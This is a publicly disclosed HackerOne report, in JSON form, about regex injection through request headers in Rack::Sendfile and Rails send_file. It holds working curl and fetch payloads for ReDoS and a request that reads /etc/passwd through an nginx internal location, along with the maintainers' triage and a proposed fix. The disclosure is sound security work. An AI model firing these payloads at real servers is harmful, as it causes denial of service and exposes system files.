{"id":1057216,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDU3MjE2","url":"https://hackerone.com/reports/1057216","title":"Regex Injection from request header (Rack::Sendfile, send_file)","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2020-12-12T02:57:06.852Z","submitted_at":"2020-12-12T02:57:06.870Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-06-15T17:43:06.159Z","bug_reporter_agreed_on_going_public_at":"2021-03-09T16:53:09.611Z","team_member_agreed_on_going_public_at":"2021-06-15T17:43:06.078Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I have confirmed that [Rack::Sendfile](https://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb) and the Rails [send_file](https://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file) that handles it have a problem handling custom headers for request.\n\nIt is expected that the `X-Sendfile-type` and `X-Accel-Mapping` headers will be sent from nginx, but these headers can also be sent from a user agent such as a browser. This allows Regexp injection to cause unexpected regular expression behavior.\n\nhttps://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb#L143\n\n```ruby\ndef variation(env)\n  @variation ||\n    env['sendfile.type'] ||\n    env['HTTP_X_SENDFILE_TYPE']\nend\n\ndef map_accel_path(env, path)\n  if mapping = @mappings.find { |internal, _| internal =~ path }\n    path.sub(*mapping)\n  elsif mapping = env['HTTP_X_ACCEL_MAPPING']\n    mapping.split(',').map(\u0026:strip).each do |m|\n      internal, external = m.split('=', 2).map(\u0026:strip)\n      new_path = path.sub(/^#{internal}/i, external)\n      return new_path unless path == new_path\n    end\n    path\n  end\nend\n```    \n\nIf not set on the application side, the value used for `internal` can be sent from the request header.\n\nThis problem seems to be a problem on the Rack side, but since it has a large impact on Rails and a vulnerability in Rack has been reported to Rails in the past(https://hackerone.com/reports/431561, https://hackerone.com/reports/895727), I will submit it here. \n\n### Case 1. ReDoS via Regex Injection\n\nExample of rails controller.\n\n```ruby\nclass FilesController \u003c ApplicationController\n  def index\n    send_file(\"./README.md\")\n  end\nend\n```\n\nOr a simple example of rack app.\n\n```ruby\nclass SendFile\n  def call(env)\n    [ 200,\n      {        },\n\n      File.open(\"./config.ru\")\n    ]\n  end\nend\n\nuse Rack::Sendfile\nrun SendFile.new\n```\n\nAn example of a curl attack on these servers.\n\n```\ncurl -i -H 'X-Sendfile-type:X-Accel-Redirect' -H 'X-Accel-Mapping:(([^\\r])+.)+[^\\r]([\\r])+=/www/' http://localhost:3000/files\n```\n\n[ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS#redos-via-regex-injection) is possible because the value of `X-Accel-Mapping` is used for the regular expression.\n\nExecuting the curl code will increase the CPU usage on the server side.In puma, the server becomes unresponsive when requests are made for the number of wokrers. When I try to start puma threads as 5 on my local machine, running curl 5 times makes the server unresponsive!\n\n```\n$ time ruby -e 'puts (\"a\"*32).gsub(/^(([^\\r])+.)+[^\\r]([\\r])+/, \"test\")'\n...\n0.23s user 0.04s system 56% cpu 0.479 total\n\n$ time ruby -e 'puts (\"a\"*40).gsub(/^(([^\\r])+.)+[^\\r]([\\r])+/, \"test\")'\n...\n8.03s user 0.04s system 97% cpu 8.242 total\n\n$ time ruby -e 'puts (\"a\"*44).gsub(/^(([^\\r])+.)+[^\\r]([\\r])+/, \"test\")'\n...\n55.92s user 0.16s system 99% cpu 56.370 total\n```\n\nHow long it actually takes depends on the depth of the path where the server is located. It is also possible to send a more dangerous regular expression than the example.\n\nFrom javascript it will be as follows.\n\n```javascript\nfetch(\"http://localhost:3000/file\", {headers: {\"X-Sendfile-type\":\"X-Accel-Redirect\", \"X-Accel-Mapping\":\"(([^\\\\r])+.)+[^\\\\r]([\\\\r])+=/www/\"}})\n```\n\n\n### Case 2. Unexpected access to internal\n\nExample nginx.conf.\n\n```\nevents {\n    worker_connections  16;\n}\nhttp {\n    server {\n        listen 80;\n        server_name localhost;\n\n        location /rails {\n            proxy_pass http://rails_app/;\n            \n            proxy_redirect off;\n        }\n\n        location /secret_internal {\n            internal;\n            alias /etc/passwd;\n        }\n    }\n}\n```\n\n```\ncurl -i -H 'X-Sendfile-type:X-Accel-Redirect' -H 'X-Accel-Mapping:/.*=/secret_internal' http://localhost:80/rails/files\n```\n\nYou can get `/etc/passwd`, a file that should not be accessible.\n\n## Impact\n\nAffects various Rails applications that use send_file with [Rack 1.1.0](https://github.com/rack/rack/commit/981f182bcfa1b848aa9e66c72500d855f6ee77ff\n) and later versions.\n\nThis can be confirmed by requesting a location that handles file downloads, so if this vulnerability information is disclosed, it may be tried in many locations. It is difficult to guess where case2 will occur, but case1 is simple. Especially in OSS, the attacker can easily check because the place of use is known.\n\nThe following patterns are affected.\n\n* Applications that do not set a value for `x_sendfile_header`.\nIf set `config.action_dispatch.x_sendfile_header = ''`, it will be workaround.\n\n* Using X-Accel-Redirect, but X-Accel-Mapping is not set.\nIt becomes workaround by adding X-Accel-Mapping to all proxy settings of nginx.\n\nI think it's safe to stop using custom headers for requests in Rack. But it's a breaking change.","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["3x3s","ekgaribadmi"],"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10086660,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. It seems like the intention is that this header only comes from a trusted source like nginx.  I don't see how it can be safe otherwise.","automated_response":false,"created_at":"2020-12-12T22:46:21.569Z","updated_at":"2020-12-12T22:46:21.569Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10214284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I confirmed the request timeout of servers.\n\nUnicorn times out in 1 minute by default and ReDoS stops.\nPuma, Puma (with Rack::Timeout), Thin, Falcon don't stop after waiting a few minutes and the request doesn't seem to time out.","automated_response":false,"created_at":"2020-12-28T03:02:04.766Z","updated_at":"2020-12-28T03:02:04.766Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10214290,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove \n\nYes.\nDue to my lack of knowledge, I can't think of a way to do it well with HTTP requests.\n\nWhen sending the header from nginx as shown below, it seems that can take measures by sending the secret value together and confirming that the value is set on the Rack side.\nHowever, consistency with the value of X-Accel-Mapping has not been confirmed.\n\n\n```\nlocation / {\n \n ...\n\n proxy_set_header   X-Sendfile-Type     X-Accel-Redirect;\n proxy_set_header   X-Accel-Mapping     /var/www/=/files/;\n proxy_set_header   X-Accel-Secert      \"random_accel_secret_value\";\n\n proxy_pass         http://127.0.0.1:8080/;\n}\n```\n\n```ruby\n    def initialize(app, variation = nil, mappings = [], accel_secret = nil)\n      @app = app\n      @variation = variation\n      @mappings = mappings.map do |internal, external|\n        [/^#{internal}/i, external]\n      end\n      @accel_secret= accel_secret\n    end\n\n...\n\n    def map_accel_path(env, path)\n      if mapping = @mappings.find { |internal, _| internal =~ path }\n        path.sub(*mapping)\n      elsif !@accel_secret.nil? \u0026\u0026 \n        env['HTTP_X_ACCEL_SECRET'] == @accel_secret \u0026\u0026\n        mapping = env['HTTP_X_ACCEL_MAPPING']\n```","automated_response":false,"created_at":"2020-12-28T03:03:34.282Z","updated_at":"2020-12-28T03:03:34.282Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10280313,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Hi @ooooooo_q.  Thanks for the additional context.  I think we should remove `Rack::SendFile` as a default middleware for Rails.  The documentation for `Rack::SendFile` explicitly asks the user to put the application behind a proxy that correctly handles this header.  Explicitly asking the user to add this middleware would encourage users to fully understand the implications.\n\nI like the idea of adding the secret, but we can't deploy that as the default fix for this issue.  It would require too many changes to user applications, I think.\n\nSince [the documentation](https://github.com/rack/rack/blob/1970771c7e01d54cb631dae0bc7618e2561ad1c7/lib/rack/sendfile.rb#L21-L53) says the application should be behind a proxy, I think we should fix this publicly.\n\nSince we're going to be changing the default middleware for Rails, can you file a ticket on [the Rails tracker](https://github.com/rails/rails/issues) please?  I will close this as informative for now.  Thank you!","automated_response":false,"created_at":"2021-01-05T21:12:59.384Z","updated_at":"2021-01-05T21:12:59.384Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10393639,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was late, I wrote it at https://github.com/rails/rails/issues/41148.","automated_response":false,"created_at":"2021-01-17T13:12:08.877Z","updated_at":"2021-01-17T13:12:08.877Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10935097,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-03-09T16:53:09.635Z","updated_at":"2021-03-09T16:53:09.635Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12131210,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-15T17:43:06.098Z","updated_at":"2021-06-15T17:43:06.098Z","actor":{"username":"rafaelfranca","cleared":false,"url":"/rafaelfranca","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12131211,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-15T17:43:06.194Z","updated_at":"2021-06-15T17:43:06.194Z","actor":{"username":"rafaelfranca","cleared":false,"url":"/rafaelfranca","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}